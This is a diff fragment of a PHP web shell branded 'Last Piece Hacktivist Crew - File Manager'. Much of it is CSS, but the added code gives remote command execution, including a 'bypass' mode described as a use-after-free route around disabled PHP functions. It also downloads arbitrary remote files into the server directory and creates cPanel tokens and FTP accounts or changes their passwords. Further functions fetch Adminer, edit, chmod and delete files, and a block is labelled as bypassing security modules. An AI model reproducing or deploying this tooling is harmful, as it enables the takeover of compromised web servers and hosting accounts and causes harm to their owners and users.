-                    } else {
-                        $errors[] = "Failed: " . $path;
-                    }
-                } else {
-                    if (@chmod($path, octdec($filePerm))) {
-                        $fileCount++;
-                    } else {
-                        $errors[] = "Failed: " . $path;
-                    }
-                }
-            }
-            
-            if (@chmod($targetPath, octdec($folderPerm))) {
-                $folderCount++;
-            }
-            
-            $cmdOutput = "=== Mass Chmod Result ===\n\n";
-            $cmdOutput .= "Target Path   : " . $targetPath . "\n";
-            $cmdOutput .= "Folder Perm   : " . $folderPerm . "\n";
-            $cmdOutput .= "File Perm     : " . $filePerm . "\n";
-            $cmdOutput .= "---\n";
-            $cmdOutput .= "Folders Fixed : " . $folderCount . "\n";
-            $cmdOutput .= "Files Fixed   : " . $fileCount . "\n";
-            
-            if (count($errors) > 0) {
-                $cmdOutput .= "\nErrors (" . count($errors) . "):\n";
-                foreach (array_slice($errors, 0, 10) as $err) {
-                    $cmdOutput .= $err . "\n";
-                }
-                if (count($errors) > 10) {
-                    $cmdOutput .= "... and " . (count($errors) - 10) . " more\n";
-                }
-            }
-            
-            $responseMessage = ['success' => true, 'message' => 'Mass chmod completed'];
-        } catch (Exception $e) {
-            $cmdOutput = "Error: " . $e->getMessage();
-            $responseMessage = ['success' => false, 'message' => 'Mass chmod failed'];
-        }
-    }
-    
-    if (isset($_POST['newfolder']) && !empty($_POST['foldername'])) {
-        $newFolderPath = $currentDirectory . '/' . $_POST['foldername'];
-        if (@mkdir($newFolderPath, 0755)) {
-            $responseMessage = ['success' => true, 'message' => 'Folder created'];
-        } else {
-            $responseMessage = ['success' => false, 'message' => 'Create failed'];
-        }
+        $responseMessage = 'cPanel token created successfully';
+    } else {
+        $cmdOutput .= "FAILED to create token.\n\n";
+        $cmdOutput .= "Raw output:\n" . ($uapiOutput ?: 'No output from uapi');
+        $responseMessage = 'Token creation failed';
     }
 }
 
+$ftpAccounts = [];
+if (isset($_POST['ftp_list']) || isset($_POST['ftp_add']) || isset($_POST['ftp_passwd']) || isset($_POST['ftp_delete'])) {
+    $ftpListRaw = runUapi('Ftp list_ftp');
+    $ftpAccounts = parseUapiFtpList($ftpListRaw);
+}
+
+if (isset($_POST['ftp_list'])) {
+    $responseMessage = count($ftpAccounts) . ' FTP account(s) found.';
+}
+
+if (isset($_POST['ftp_add']) && !empty($_POST['ftp_user']) && !empty($_POST['ftp_pass'])) {
+    $ftpUser = $_POST['ftp_user'];
+    $ftpPass = $_POST['ftp_pass'];
+    $ftpQuota = !empty($_POST['ftp_quota']) ? $_POST['ftp_quota'] : '0';
+    $homeDir = getenv('HOME') ?: ('/home/' . get_current_user());
+    $addOutput = runUapi('Ftp add_ftp user=' . escapeshellarg($ftpUser) . ' pass=' . escapeshellarg($ftpPass) . ' quota=' . escapeshellarg($ftpQuota) . ' homedir=' . escapeshellarg($homeDir));
+    $parsed = parseUapiStatus($addOutput);
+    if ($parsed['ok']) {
+        $responseMessage = 'FTP account "' . $ftpUser . '" created successfully.';
+    } else {
+        $errorMessage = 'FTP creation failed. Check output.';
+        $cmdOutput = $addOutput;
+    }
+}
+
+if (isset($_POST['ftp_passwd']) && !empty($_POST['ftp_chg_user']) && !empty($_POST['ftp_chg_pass']) && !empty($_POST['ftp_chg_domain'])) {
+    $chgUser = $_POST['ftp_chg_user'];
+    $chgPass = $_POST['ftp_chg_pass'];
+    $chgDomain = $_POST['ftp_chg_domain'];
+    $passwdOutput = runUapi('Ftp passwd user=' . escapeshellarg($chgUser) . ' domain=' . escapeshellarg($chgDomain) . ' pass=' . escapeshellarg($chgPass));
+    $parsed = parseUapiStatus($passwdOutput);
+    if ($parsed['ok']) {
+        $responseMessage = 'Password changed for "' . $chgUser . '@' . $chgDomain . '".';
+    } else {
+        $errorMessage = 'Password change failed.';
+        $cmdOutput = $passwdOutput;
+    }
+}
+
+if (isset($_POST['ftp_delete']) && !empty($_POST['ftp_del_user']) && !empty($_POST['ftp_del_domain'])) {
+    $delUser = $_POST['ftp_del_user'];
+    $delDomain = $_POST['ftp_del_domain'];
+    $delOutput = runUapi('Ftp delete_ftp user=' . escapeshellarg($delUser) . ' domain=' . escapeshellarg($delDomain));
+    $parsed = parseUapiStatus($delOutput);
+    if ($parsed['ok']) {
+        $responseMessage = 'FTP account "' . $delUser . '@' . $delDomain . '" deleted.';
+    } else {
+        $errorMessage = 'FTP deletion failed.';
+        $cmdOutput = $delOutput;
+    }
+}
+
+// === WORDPRESS MANAGER ===
+$wpAvailable = false;
+$wpLoadPath = findWpLoad();
+if ($wpLoadPath) $wpAvailable = true;
+
+if (isset($_POST['remote_upload']) && !empty($_POST['remote_url'])) {
+    $url = $_POST['remote_url'];
+    $fname = !empty($_POST['remote_filename']) ? $_POST['remote_filename'] : basename(parse_url($url, PHP_URL_PATH));
+    $target = $currentDirectory . '/' . $fname;
+    fixPermission($currentDirectory);
+    $content = @file_get_contents($url);
+    if ($content === false && function_exists('curl_init')) {
+        $ch = curl_init($url);
+        curl_setopt_array($ch, [CURLOPT_RETURNTRANSFER=>true,CURLOPT_FOLLOWLOCATION=>true,CURLOPT_TIMEOUT=>30,CURLOPT_SSL_VERIFYPEER=>false]);
+        $content = curl_exec($ch); curl_close($ch);
+    }
+    if ($content !== false && @file_put_contents($target, $content) !== false) $responseMessage = "Remote file downloaded: $fname";
+    else $responseMessage = 'Failed to download remote file.';
+}
+
+if (isset($_GET['edit'])) {
+    $file = $_GET['edit'];
+    $content = readFileContent($file);
+    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['content'])) {
+        if (saveFileContent($file)) $responseMessage = 'File saved.';
+        else $errorMessage = 'Error saving file.';
+    }
+}
+
+if (isset($_GET['chmod'])) {
+    $file = $_GET['chmod'];
+    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['permission'])) {
+        $perm = intval($_POST['permission'], 8);
+        if ($perm > 0 && @chmod($file, $perm)) $responseMessage = 'Permission changed.';
+        else $errorMessage = 'Error changing permission.';
+    }
+}
+
+if (isset($_POST['upload'])) {
+    $responseMessage = uploadFile($currentDirectory);
+}
+
+if (isset($_POST['cmd']) && !empty($_POST['cmd'])) {
+    $useBypass = isset($_POST['use_bypass']) && $_POST['use_bypass'] === '1';
+    if ($useBypass) {
+        $bypassOut = runBypass($_POST['cmd']);
+        $cmdOutput = $bypassOut ?: 'Bypass returned no output. UAF may not work on this PHP version.';
+    } else {
+        $cmdOutput = executeCommand($_POST['cmd']);
+    }
+}
+
+if (isset($_POST['eclipse']) && !empty($_POST['eclipse'])) {
+    $bypassOut = runBypass($_POST['eclipse']);
+    $cmdOutput = $bypassOut ?: 'Bypass returned no output. UAF may not work on this PHP version.';
+}
+
+if (isset($_GET['rename']) && $_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['new_name'])) {
+    $file = $_GET['rename'];
+    $responseMessage = renameFile($file, $_POST['new_name']);
+}
+
+if (isset($_GET['del'])) {
+    $file = $_GET['del'];
+    $fileDir = dirname($file);
+    if (deleteFile($file)) {
+        header('Location: ?lph=' . urlencode($fileDir) . '&msg=deleted');
+        exit;
+    } else {
+        $errorMessage = 'Failed to delete: ' . basename($file);
+    }
+}
+
+if (isset($_POST['Summon'])) {
+    $url = 'https://github.com/vrana/adminer/releases/download/v4.8.1/adminer-4.8.1.php';
+    $filePath = $currentDirectory . '/Adminer.php';
+    $fileContent = @file_get_contents($url);
+    if ($fileContent !== false && @file_put_contents($filePath, $fileContent) !== false) {
+        $responseMessage = 'Adminer summoned successfully.';
+    } else {
+        $errorMessage = 'Failed to summon Adminer.';
+    }
+}
+
+if (isset($_POST['scan_deeply'])) {
+    $results = scanDeepestDirectory($currentDirectory);
+    $cmdOutput = "=== Deepest Directories ===\n";
+    if (empty($results)) $cmdOutput .= "No subdirectories found.";
+    else foreach ($results as $r) $cmdOutput .= $r . "\n";
+}
+
+if (isset($_POST['scan_newly'])) {
+    $ext = isset($_POST['scan_ext']) ? $_POST['scan_ext'] : 'php';
+    $results = scanNewlyFiles($currentDirectory, $ext);
+    $cmdOutput = "=== Newest .$ext Files ===\n";
+    if (empty($results)) $cmdOutput .= "No files found.";
+    else foreach ($results as $r) $cmdOutput .= date('Y-m-d H:i:s', $r['time']) . " | " . $r['path'] . "\n";
+}
+
+if (isset($_GET['msg']) && $_GET['msg'] === 'deleted') {
+    $responseMessage = 'Item deleted successfully.';
+}
+
+// Bypass security modules
+if (function_exists('litespeed_request_headers')) {
+    $headers = litespeed_request_headers();
+    if (isset($headers['X-LSCACHE'])) header('X-LSCACHE: off');
+}
 ?>
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title>Last Piece Hacktivist Crew - File Manager</title>
-    <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        
-        :root {
-            --bg-dark: #0a0e1a;
-            --bg-card: #111827;
-            --bg-input: #0d1321;
-            --border: #1e3a5f;
-            --border-light: #1a2744;
-            --text: #c9d1d9;
-            --text-muted: #6b8aaa;
-            --text-bright: #f0f6fc;
-            --accent: #00d4ff;
-            --green: #00d4ff;
-            --gold: #d4a520;
-            --orange: #e07020;
-            --red: #f85149;
-            --purple: #a371f7;
-            --ocean: #0f4c81;
-            --ocean-light: #1a6faa;
-            --glow-cyan: rgba(0, 212, 255, 0.3);
-            --glow-gold: rgba(212, 165, 32, 0.3);
-        }
-        
-        body {
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Helvetica, Arial, sans-serif;
-            background: var(--bg-dark);
-            color: var(--text);
-            min-height: 100vh;
-            font-size: 14px;
-            line-height: 1.5;
-        }
-        
-        .video-background {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            z-index: -1;
-            overflow: hidden;
-        }
-        
-        .video-background video {
-            position: absolute;
-            top: 50%;
-            left: 50%;
-            min-width: 100%;
-            min-height: 100%;
-            width: auto;
-            height: auto;
-            transform: translate(-50%, -50%);
-            object-fit: cover;
-        }
-        
-        .video-background::after {
-            content: '';
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(10, 14, 26, 0.75);
-            pointer-events: none;
-        }
-        
-        a { color: var(--accent); text-decoration: none; }
-        a:hover { text-decoration: underline; }
-        
-        .login-page {
-            min-height: 100vh;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            padding: 20px;
-            position: relative;
-        }
-        
-        .login-card {
-            background: linear-gradient(145deg, rgba(17, 24, 39, 0.95), rgba(10, 14, 26, 0.98));
-            border: 1px solid var(--border);
-            border-radius: 16px;
-            padding: 40px 32px;
-            width: 100%;
-            max-width: 400px;
-            box-shadow: 
-                0 0 40px rgba(0, 212, 255, 0.1),
-                0 0 80px rgba(212, 165, 32, 0.05),
-                inset 0 1px 0 rgba(255, 255, 255, 0.05);
-            position: relative;
-            overflow: hidden;
-        }
-        
-        .login-card::before {
-            content: '';
-            position: absolute;
-            top: 0;
-            left: 0;
-            right: 0;
-            height: 3px;
-            background: linear-gradient(90deg, var(--accent), var(--gold), var(--accent));
-        }
-        
-        .login-header {
-            text-align: center;
-            margin-bottom: 28px;
-        }
-        
-        .login-logo {
-            width: 80px;
-            height: 80px;
-            margin: 0 auto 16px;
-            border-radius: 50%;
-            overflow: hidden;
-            border: 3px solid var(--gold);
-            box-shadow: 0 0 20px var(--glow-gold), 0 0 40px var(--glow-cyan);
-        }
-        
-        .login-logo img {
-            width: 100%;
-            height: 100%;
-            object-fit: cover;
-        }
-        
-        .login-title {
-            font-size: 22px;
-            font-weight: 700;
-            background: linear-gradient(90deg, var(--gold), var(--orange));
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-            background-clip: text;
-            margin-bottom: 4px;
-            text-shadow: 0 0 30px var(--glow-gold);
-        }
-        
-        .login-subtitle {
-            color: var(--accent);
-            font-size: 12px;
-            text-transform: uppercase;
-            letter-spacing: 2px;
-        }
-        
-        .form-group {
-            margin-bottom: 16px;
-        }
-        
-        .form-label {
-            display: block;
-            font-size: 12px;
-            font-weight: 500;
-            color: var(--text);
-            margin-bottom: 8px;
-        }
-        
-        .form-input {
-            width: 100%;
-            padding: 10px 12px;
-            background: var(--bg-input);
-            border: 1px solid var(--border);
-            border-radius: 6px;
-            color: var(--text);
-            font-size: 14px;
-            transition: border-color 0.2s, box-shadow 0.2s;
-        }
-        
-        .form-input:focus {
-            outline: none;
-            border-color: var(--accent);
-            box-shadow: 0 0 0 3px rgba(88, 166, 255, 0.15);
-        }
-        
-        .form-input::placeholder { color: var(--text-muted); }
-        
-        .btn {
-            display: inline-flex;
-            align-items: center;
-            justify-content: center;
-            gap: 6px;
-            padding: 10px 16px;
-            font-size: 14px;
-            font-weight: 500;
-            border-radius: 6px;
-            border: 1px solid transparent;
-            cursor: pointer;
-            transition: all 0.2s;
-        }
-        
-        .btn-primary {
-            background: linear-gradient(135deg, var(--gold), var(--orange));
-            color: #0a0e1a;
-            border-color: var(--gold);
-            font-weight: 600;
-        }
-        
-        .btn-primary:hover { 
-            background: linear-gradient(135deg, #e0b020, #f08030);
-            box-shadow: 0 0 15px var(--glow-gold);
-        }
-        
-        .btn-wordpress {
-            background: linear-gradient(135deg, #21759b, #0073aa);
-            color: white;
-            border-color: #21759b;
-            text-decoration: none;
-        }
-        
-        .btn-wordpress:hover { 
-            background: linear-gradient(135deg, #2a8ab5, #0085c4);
-            box-shadow: 0 0 15px rgba(33, 117, 155, 0.5);
-        }
-        
-        .btn-gsocket {
-            background: linear-gradient(135deg, #8b5cf6, #7c3aed);
-            color: white;
-            border-color: #8b5cf6;
-        }
-        
-        .btn-gsocket:hover { 
-            background: linear-gradient(135deg, #9d6fff, #8b5cf6);
-            box-shadow: 0 0 15px rgba(139, 92, 246, 0.5);
-        }
-        
-        .btn-cpanel {
-            background: linear-gradient(135deg, #ff6a00, #ee5a00);
-            color: white;
-            border-color: #ff6a00;
-        }
-        
-        .btn-cpanel:hover { 
-            background: linear-gradient(135deg, #ff8020, #ff6a00);
-            box-shadow: 0 0 15px rgba(255, 106, 0, 0.5);
-        }
-        
-        .btn-ftp {
-            background: linear-gradient(135deg, #10b981, #059669);
-            color: white;
-            border-color: #10b981;
-        }
-        
-        .btn-ftp:hover { 
-            background: linear-gradient(135deg, #34d399, #10b981);
-            box-shadow: 0 0 15px rgba(16, 185, 129, 0.5);
-        }
-        
-        .btn-scan {
-            background: linear-gradient(135deg, #06b6d4, #0891b2);
-            color: white;
-            border-color: #06b6d4;
-        }
-        
-        .btn-scan:hover { 
-            background: linear-gradient(135deg, #22d3ee, #06b6d4);
-            box-shadow: 0 0 15px rgba(6, 182, 212, 0.5);
-        }
-        
-        .btn-chmod {
-            background: linear-gradient(135deg, #ec4899, #db2777);
-            color: white;
-            border-color: #ec4899;
-        }
-        
-        .btn-chmod:hover { 
-            background: linear-gradient(135deg, #f472b6, #ec4899);
-            box-shadow: 0 0 15px rgba(236, 72, 153, 0.5);
-        }
-        
-        .btn-remote {
-            background: linear-gradient(135deg, #f59e0b, #d97706);
-            color: white;
-            border-color: #f59e0b;
-        }
-        
-        .btn-remote:hover { 
-            background: linear-gradient(135deg, #fbbf24, #f59e0b);
-            box-shadow: 0 0 15px rgba(245, 158, 11, 0.5);
-        }
-        
-        .btn-secondary {
-            background: var(--bg-card);
-            color: var(--text);
-            border-color: var(--border);
-        }
-        
-        .btn-secondary:hover { background: var(--border-light); }
-        
-        .btn-danger {
-            background: transparent;
-            color: var(--red);
-            border-color: var(--border);
-        }
-        
-        .btn-danger:hover { background: rgba(248, 81, 73, 0.1); }
-        
-        .btn-sm { padding: 6px 12px; font-size: 12px; }
-        .btn-xs { padding: 4px 8px; font-size: 11px; }
-        
-        .error-msg {
-            background: rgba(248, 81, 73, 0.1);
-            border: 1px solid rgba(248, 81, 73, 0.4);
-            color: var(--red);
-            padding: 10px 12px;
-            border-radius: 6px;
-            font-size: 13px;
-            margin-bottom: 16px;
-        }
-        
-        .success-msg {
-            background: rgba(0, 212, 255, 0.1);
-            border: 1px solid rgba(0, 212, 255, 0.4);
-            color: var(--accent);
-            padding: 10px 12px;
-            border-radius: 6px;
-            font-size: 13px;
-            margin-bottom: 16px;
-        }
-        
-        .app { min-height: 100vh; display: flex; flex-direction: column; }
-        
-        .header {
-            background: linear-gradient(180deg, rgba(17, 24, 39, 0.98), rgba(10, 14, 26, 0.95));
-            border-bottom: 1px solid var(--border);
-            padding: 12px 16px;
-            position: sticky;
-            top: 0;
-            z-index: 100;
-            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.3), 0 0 30px rgba(0, 212, 255, 0.05);
-        }
-        
-        .header::after {
-            content: '';
-            position: absolute;
-            bottom: 0;
-            left: 0;
-            right: 0;
-            height: 1px;
-            background: linear-gradient(90deg, transparent, var(--accent), var(--gold), var(--accent), transparent);
-        }
-        
-        .header-content {
-            display: flex;
-            align-items: center;
-            justify-content: space-between;
-            gap: 12px;
-            max-width: 1400px;
-            margin: 0 auto;
-        }
-        
-        .brand {
-            display: flex;
-            align-items: center;
-            gap: 10px;
-            flex-shrink: 0;
-        }
-        
-        .brand-icon {
-            width: 36px;
-            height: 36px;
-            border-radius: 50%;
-            overflow: hidden;
-            border: 2px solid var(--gold);
-            box-shadow: 0 0 10px var(--glow-gold);
-        }
-        
-        .brand-icon img { 
-            width: 100%; 
-            height: 100%; 
-            object-fit: cover; 
-        }
-        
-        .brand-text {
-            font-size: 13px;
-            font-weight: 700;
-            color: var(--text-bright);
-        }
-        
-        .brand-text span {
-            background: linear-gradient(90deg, var(--gold), var(--orange));
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-            background-clip: text;
-        }
-        
-        .brand-text small {
-            display: block;
-            font-size: 9px;
-            font-weight: 500;
-            color: var(--accent);
-            text-transform: uppercase;
-            letter-spacing: 1px;
-            margin-top: -2px;
-        }
-        
-        .header-actions {
-            display: flex;
-            align-items: center;
-            gap: 8px;
-        }
-        
-        .main {
-            flex: 1;
-            padding: 16px;
-            max-width: 1400px;
-            margin: 0 auto;
-            width: 100%;
-        }
-        
-        .breadcrumb {
-            background: var(--bg-card);
-            border: 1px solid var(--border);
-            border-radius: 8px;
-            padding: 10px 14px;
-            margin-bottom: 16px;
-            display: flex;
-            align-items: center;
-            gap: 6px;
-            overflow-x: auto;
-            white-space: nowrap;
-            font-size: 13px;
-        }
-        
-        .breadcrumb::-webkit-scrollbar { height: 0; }
-        
-        .breadcrumb-icon {
-            width: 16px;
-            height: 16px;
-            color: var(--text-muted);
-            flex-shrink: 0;
-        }
-        
-        .breadcrumb a { color: var(--accent); }
-        .breadcrumb a:hover { color: var(--gold); text-decoration: none; }
-        .breadcrumb-sep { color: var(--gold); }
-        
-        .card {
-            background: var(--bg-card);
-            border: 1px solid var(--border);
-            border-radius: 8px;
-            overflow: hidden;
-        }
-        
-        .card-header {
-            padding: 14px 16px;
-            border-bottom: 1px solid var(--border);
-            display: flex;
-            align-items: center;
-            gap: 10px;
-            font-size: 14px;
-            font-weight: 600;
-            color: var(--text-bright);
-        }
-        
-        .card-header svg {
-            width: 18px;
-            height: 18px;
-            color: var(--gold);
-            flex-shrink: 0;
-        }
-        
-        .card-body {
-            padding: 16px;
-        }
-        
-        .form-group {
-            margin-bottom: 14px;
-        }
-        
-        .form-label {
-            display: block;
-            font-size: 13px;
-            font-weight: 500;
-            color: var(--text-muted);
-            margin-bottom: 6px;
-        }
-        
-        .form-input {
-            width: 100%;
-            padding: 10px 12px;
-            background: var(--bg-input);
-            border: 1px solid var(--border);
-            border-radius: 6px;
-            color: var(--text);
-            font-size: 13px;
-        }
-        
-        .form-input:focus {
-            outline: none;
-            border-color: var(--green);
-        }
-        
-        .text-muted {
-            color: var(--text-muted);
-        }
-        
-        .action-form {
-            background: var(--bg-card);
-            border: 1px solid var(--border);
-            border-radius: 8px;
-            overflow: hidden;
-        }
-        
-        .action-form-header {
-            padding: 12px 16px;
-            border-bottom: 1px solid var(--border);
-            display: flex;
-            align-items: center;
-            justify-content: space-between;
-            gap: 12px;
-        }
-        
-        .action-form-title {
-            display: flex;
-            align-items: center;
-            gap: 10px;
-            font-size: 14px;
-            font-weight: 600;
-            color: var(--text-bright);
-        }
-        
-        .action-form-title svg {
-            color: var(--gold);
-            flex-shrink: 0;
-        }
-        
-        .action-form-file {
-            font-weight: 400;
-            color: var(--text-muted);
-            font-size: 13px;
-        }
-        
-        .action-form-body {
-            padding: 16px;
-        }
-        
-        .form-inline {
-            display: flex;
-            align-items: center;
-            gap: 12px;
-        }
-        
-        .form-label-inline {
-            font-size: 13px;
-            font-weight: 500;
-            color: var(--text-muted);
-            white-space: nowrap;
-            min-width: 80px;
-        }
-        
-        .form-input-inline {
-            flex: 1;
-            padding: 10px 12px;
-            background: var(--bg-input);
-            border: 1px solid var(--border);
-            border-radius: 6px;
-            color: var(--text);
-            font-size: 13px;
-        }
-        
-        .form-input-inline:focus {
-            outline: none;
-            border-color: var(--green);
-        }
-        
-        .toolbar {
-            background: var(--bg-card);
-            border: 1px solid var(--border);
-            border-radius: 8px;
-            padding: 12px 16px;
-            margin-bottom: 10px;
-            display: flex;
-            flex-wrap: wrap;
-            align-items: center;
-            gap: 12px;
-        }
-        
-        .toolbar-label {
-            font-size: 11px;
-            font-weight: 600;
-            color: var(--gold);
-            text-transform: uppercase;
-            letter-spacing: 1px;
-            min-width: 65px;
-            padding-right: 10px;
-            border-right: 1px solid var(--border);
-        }
-        
-        .toolbar-section {
-            display: flex;
-            align-items: center;
-            gap: 8px;
-            flex-wrap: wrap;
-        }
-        
-        .terminal-form {
-            flex: 1;
-            display: flex;
-            align-items: center;
-            gap: 8px;
-            flex: 1;
-            min-width: 200px;
-            width: 100%;
-        }
-        
-        .terminal-label {
-            display: flex;
-            align-items: center;
-            gap: 6px;
-            color: var(--green);
-            font-size: 13px;
-            font-weight: 500;
-            white-space: nowrap;
-            flex-shrink: 0;
-        }
-        
-        .terminal-label svg {
-            width: 16px;
-            height: 16px;
-        }
-        
-        .terminal-input {
-            flex: 1 1 auto;
-            min-width: 150px;
-            width: 100%;
-            padding: 8px 12px;
-            background: var(--bg-input);
-            border: 1px solid var(--border);
-            border-radius: 6px;
-            color: var(--accent);
-            font-family: 'SFMono-Regular', Consolas, monospace;
-            font-size: 13px;
-        }
-        
-        .terminal-form .btn {
-            flex-shrink: 0;
-        }
-        
-        .terminal-input:focus {
-            outline: none;
-            border-color: var(--accent);
-            box-shadow: 0 0 10px var(--glow-cyan);
-        }
-        
-        .terminal-output {
-            background: var(--bg-card);
-            border: 1px solid var(--border);
-            border-radius: 8px;
-            padding: 12px 16px;
-            margin-bottom: 16px;
-            font-family: 'SFMono-Regular', Consolas, monospace;
-            font-size: 12px;
-            max-height: 150px;
-            overflow: auto;
-            white-space: pre-wrap;
-            word-break: break-all;
-            color: var(--text);
-        }
-        
-        .upload-label {
-            display: flex;
-            align-items: center;
-            gap: 8px;
-            padding: 8px 14px;
-            background: var(--bg-input);
-            border: 1px solid var(--border);
-            border-radius: 6px;
-            cursor: pointer;
-            transition: all 0.2s;
-            font-size: 13px;
-            color: var(--text);
-        }
-        
-        .upload-label:hover {
-            border-color: var(--accent);
-            background: rgba(88, 166, 255, 0.05);
-        }
-        
-        .upload-label svg {
-            width: 16px;
-            height: 16px;
-            color: var(--accent);
-        }
-        
-        .upload-label input { display: none; }
-        
-        .action-buttons {
-            display: flex;
-            flex-wrap: wrap;
-            gap: 8px;
-            align-items: center;
-        }
-        
-        .table-wrapper {
-            background: var(--bg-card);
-            border: 1px solid var(--border);
-            border-radius: 8px;
-            overflow: hidden;
-        }
-        
-        .table-scroll {
-            overflow-x: auto;
-        }
-        
-        .file-table {
-            width: 100%;
-            border-collapse: collapse;
-            font-size: 13px;
-        }
-        
-        .file-table th,
-        .file-table td {
-            padding: 10px 14px;
-            text-align: left;
-            border-bottom: 1px solid var(--border);
-        }
-        
-        .file-table th {
-            background: linear-gradient(180deg, rgba(0, 212, 255, 0.05), transparent);
-            font-weight: 600;
-            color: var(--gold);
-            font-size: 11px;
-            text-transform: uppercase;
-            letter-spacing: 0.5px;
-            white-space: nowrap;
-        }
-        
-        .file-table tr:last-child td { border-bottom: none; }
-        
-        .file-table tr:hover td { 
-            background: rgba(0, 212, 255, 0.03); 
-        }
-        
-        .file-name {
-            display: flex;
-            align-items: center;
-            gap: 10px;
-        }
-        
-        .file-icon {
-            width: 18px;
-            height: 18px;
-            flex-shrink: 0;
-        }
-        
-        .file-icon.folder { color: var(--gold); }
-        .file-icon.code { color: var(--accent); }
-        .file-icon.image { color: var(--purple); }
-        .file-icon.archive { color: var(--orange); }
-        .file-icon.file { color: var(--text-muted); }
-        
-        .perm-writable { color: var(--green); font-weight: 500; }
-        .perm-readonly { color: var(--red); font-weight: 500; }
-        .perm-neutral { color: var(--text); }
-        
-        .file-actions {
-            display: flex;
-            gap: 4px;
-        }
-        
-        .action-btn {
-            padding: 4px 8px;
-            background: transparent;
-            border: 1px solid var(--border);
-            border-radius: 4px;
-            color: var(--text-muted);
-            font-size: 11px;
-            cursor: pointer;
-            transition: all 0.2s;
-            text-decoration: none;
-        }
-        
-        .action-btn:hover {
-            background: var(--border-light);
-            color: var(--text);
-            text-decoration: none;
-        }
-        
-        .action-btn.danger:hover {
-            background: rgba(248, 81, 73, 0.1);
-            border-color: var(--red);
-            color: var(--red);
-        }
-        
-        .editor-container {
-            background: var(--bg-card);
-            border: 1px solid var(--border);
-            border-radius: 8px;
-            overflow: hidden;
-        }
-        
-        .editor-header {
-            padding: 12px 14px;
-            border-bottom: 1px solid var(--border);
-            display: flex;
-            align-items: center;
-            justify-content: space-between;
-            gap: 12px;
-            flex-wrap: wrap;
-        }
-        
-        .editor-title {
-            font-size: 13px;
-            font-weight: 600;
-            color: var(--text-bright);
-            display: flex;
-            align-items: center;
-            gap: 8px;
-        }
-        
-        .editor-actions {
-            display: flex;
-            gap: 8px;
-        }
-        
-        .editor-textarea {
-            width: 100%;
-            min-height: 400px;
-            padding: 14px;
-            background: var(--bg-input);
-            border: none;
-            color: var(--text);
-            font-family: 'SFMono-Regular', Consolas, monospace;
-            font-size: 13px;
-            line-height: 1.6;
-            resize: vertical;
-        }
-        
-        .editor-textarea:focus { outline: none; }
-        
-        .modal-overlay {
-            position: fixed;
-            inset: 0;
-            background: rgba(0, 0, 0, 0.7);
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            padding: 20px;
-            z-index: 1000;
-        }
-        
-        .modal {
-            background: var(--bg-card);
-            border: 1px solid var(--border);
-            border-radius: 12px;
-            width: 100%;
-            max-width: 400px;
-        }
-        
-        .modal-header {
-            padding: 16px;
-            border-bottom: 1px solid var(--border);
-            display: flex;
-            align-items: center;
-            justify-content: space-between;
-        }
-        
-        .modal-title {
-            font-size: 16px;
-            font-weight: 600;
-            color: var(--text-bright);
-        }
-        
-        .modal-close {
-            background: none;
-            border: none;
-            color: var(--text-muted);
-            cursor: pointer;
-            padding: 4px;
-        }
-        
-        .modal-close:hover { color: var(--text); }
-        
-        .modal-body { padding: 16px; }
-        .modal-footer {
-            padding: 16px;
-            border-top: 1px solid var(--border);
-            display: flex;
-            gap: 8px;
-            justify-content: flex-end;
-        }
-        
-        @media (max-width: 900px) {
-            .toolbar { 
-                flex-direction: column;
-                align-items: stretch;
-                gap: 10px;
-            }
-            .toolbar-divider { display: none; }
-            .terminal-form { width: 100%; }
-            .toolbar-section { 
-                justify-content: center;
-                flex-wrap: wrap;
-            }
-            .action-buttons {
-                justify-content: center;
-                width: 100%;
-            }
-        }
-        
-        @media (max-width: 768px) {
-            .header { padding: 10px 12px; }
-            .brand-text { display: none; }
-            .main { padding: 12px; }
-            .breadcrumb { padding: 8px 12px; font-size: 12px; }
-            
-            .file-table th,
-            .file-table td { padding: 8px 10px; }
-            
-            .hide-mobile { display: none; }
-            
-            .file-actions { flex-wrap: wrap; gap: 4px; }
-        }
-        
-        @media (max-width: 600px) {
-            .info-row {
-                padding: 8px 12px;
-                font-size: 12px;
-            }
-            .info-row .info-label {
-                min-width: 100px;
-            }
-            .disabled-list {
-                gap: 4px;
-            }
-            .disabled-func {
-                font-size: 10px;
-                padding: 2px 6px;
-            }
-        }
-        
-        @media (max-width: 480px) {
-            .header-content { flex-wrap: wrap; }
-            .breadcrumb { font-size: 11px; }
-            .file-table { font-size: 12px; }
-            .action-btn { padding: 3px 6px; font-size: 10px; }
-            .toolbar { padding: 10px 12px; }
-            .terminal-label { display: none; }
-            .btn-sm { padding: 6px 10px; font-size: 11px; }
-        }
-        
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Last Piece Hacktivist Crew - File Manager</title>
+<style>
+:root {
+    --bg: #0a0a1a;
+    --bg-card: #111128;
+    --bg-input: #0d0d1e;
+    --border: #1e1e3a;
+    --text: #e0e0f0;
+    --text-muted: #6a6a8a;
+    --gold: #ffd700;
+    --gold-dark: #cc9900;
+    --accent: #00d4ff;
+    --red: #f85149;
+    --green: #3fb950;
+    --purple: #a855f7;
+}
+
+* { box-sizing: border-box; margin: 0; padding: 0; }
+
+body {
+    font-family: 'SF Mono', 'Cascadia Code', 'Consolas', monospace;
+    font-size: 13px;
+    background: var(--bg);
+    color: var(--text);
+    min-height: 100vh;
+}
+
+.app-header {
+    background: linear-gradient(135deg, #0d0d1e 0%, #1a0a2e 100%);
+    border-bottom: 1px solid var(--border);
+    padding: 12px 20px;
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+}
+
+.header-left { display: flex; align-items: center; gap: 12px; }
+
+.header-logo { width: 32px; height: 32px; border-radius: 8px; }
+
+.header-title {
+    font-size: 16px;
+    font-weight: 700;
